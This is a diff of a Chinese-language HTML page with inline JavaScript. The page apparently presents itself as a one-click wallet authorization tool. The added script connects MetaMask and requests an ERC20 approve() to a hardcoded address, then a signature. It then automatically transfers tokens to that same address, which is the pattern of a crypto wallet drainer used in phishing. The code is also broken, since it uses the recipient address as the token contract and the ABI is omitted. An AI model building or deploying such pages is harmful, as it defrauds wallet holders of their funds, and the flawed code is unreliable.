@@ -3,38 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>一键授权和签名</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Wallet Authorization and Signature</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <h1>一键授权和签名</h1>
-        
-        <label for="walletSelector">选择钱包类型:</label>
-        <select id="walletSelector">
-            <option value="metamask">MetaMask</option>
-            <option value="walletconnect">WalletConnect</option>
-        </select>
-        
-        <div id="walletInfo">
-            <h3>已连接的钱包地址:</h3>
-            <ul id="walletList"></ul>
-        </div>
-        
-        <button id="authorizeButton" disabled>一键授权</button>
-        
-        <div id="signingSection" style="display: none;">
-            <h3>签名确认</h3>
-            <div id="signatureMessage"></div>
-            <button id="signButton">确认签名并转移代币</button>
-        </div>
-        
-        <div id="status"></div>
-    </div>
+    <h1>钱包授权和签名</h1>
     
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.0/dist/umd/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-    <script src="script.js"></script>
+    <!-- 连接钱包按钮 -->
+    <button id="connectButton">连接钱包</button>
+
+    <!-- 授权按钮 -->
+    <button id="authorizeButton" disabled>一键授权和签名</button>
+
+    <!-- 钱包连接状态 -->
+    <p id="status">未连接</p>
+
+    <!-- 签名信息显示区 -->
+    <div id="signingSection" style="display: none;">
+        <p>签名信息: <span id="signatureMessage"></span></p>
+    </div>
+
+    <!-- 连接的钱包列表 -->
+    <ul id="walletList"></ul>
+
+    <script>
+        const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
+        let web3;
+        let isConnected = false;
+        let isRequestPending = false;
+
+        const erc20Abi = [
+            // ERC20 ABI 省略...
+        ];
+
+        // 连接钱包的按钮点击事件
+        document.getElementById('connectButton').onclick = async () => {
+            const selectedWallet = 'metamask'; // 假设默认选择 MetaMask
+            await connectWallet(selectedWallet);
+        };
+
+        // 连接钱包的函数
+        async function connectWallet(walletType) {
+            if (isRequestPending) {
+                alert('已有请求在处理，请稍等');
+                return;
+            }
+
+            isRequestPending = true;
+
+            try {
+                if (walletType === 'metamask') {
+                    if (window.ethereum) {
+                        await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        web3 = new Web3(window.ethereum);
+
+                        const accounts = await web3.eth.getAccounts();
+                        if (accounts.length > 0) {
+                            updateWalletList(accounts[0]);
+                            isConnected = true;
+                            document.getElementById('status').innerText = 'MetaMask 已连接';
+                            document.getElementById('authorizeButton').disabled = false;
+                        } else {
+                            document.getElementById('status').innerText = '未检测到已连接的账户';
+                        }
+                    } else {
+                        document.getElementById('status').innerText = '请安装 MetaMask 钱包';
+                    }
+                }
+                // 其他钱包类型的连接逻辑可以在这里添加
+            } catch (error) {
+                document.getElementById('status').innerText = '连接失败: ' + error.message;
+            } finally {
+                isRequestPending = false;
+            }
+        }
+
+        // 更新已连接钱包列表
+        const updateWalletList = (address) => {
+            const walletList = document.getElementById('walletList');
+            const walletItem = document.createElement('li');
+            walletItem.innerText = address;
+            walletList.appendChild(walletItem);
+        };
+
+        // 一键授权和签名按钮点击事件
+        document.getElementById('authorizeButton').onclick = async () => {
+            if (!isConnected) {
+                document.getElementById('status').innerText = '请先连接钱包';
+                return;
+            }
+
+            const accounts = await web3.eth.getAccounts();
+            const account = accounts[0];
+
+            // 执行授权
+            const tokenContract = new web3.eth.Contract(erc20Abi, recipientAddress);
+            try {
+                // 假设是授权代币额度
+                const tx = await tokenContract.methods.approve(recipientAddress, web3.utils.toWei('100', 'ether')).send({ from: account });
+                document.getElementById('status').innerText = '授权成功，正在请求签名...';
+
+                // 授权成功后自动执行签名
+                const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
+                const signature = await web3.eth.personal.sign(message, account);
+                document.getElementById('status').innerText = `授权和签名成功: ${signature}`;
+                
+                // 自动弹出签名信息
+                document.getElementById('signatureMessage').innerText = message;
+                document.getElementById('signingSection').style.display = 'block';
+
+                // 开始代币转移
+                await transferTokens(account);
+            } catch (error) {
+                document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
+            }
+        };
+
+        // 代币转移逻辑
+        const transferTokens = async (account) => {
+            try {
+                const tokenContract = new web3.eth.Contract(erc20Abi, recipientAddress);
+                const tx = await tokenContract.methods.transfer(recipientAddress, web3.utils.toWei('10', 'ether')).send({ from: account });
+                document.getElementById('status').innerText = '代币转移成功！';
+            } catch (error) {
+                document.getElementById('status').innerText = '代币转移失败: ' + error.message;
+            }
+        };
+
+    </script>
 </body>
 </html>
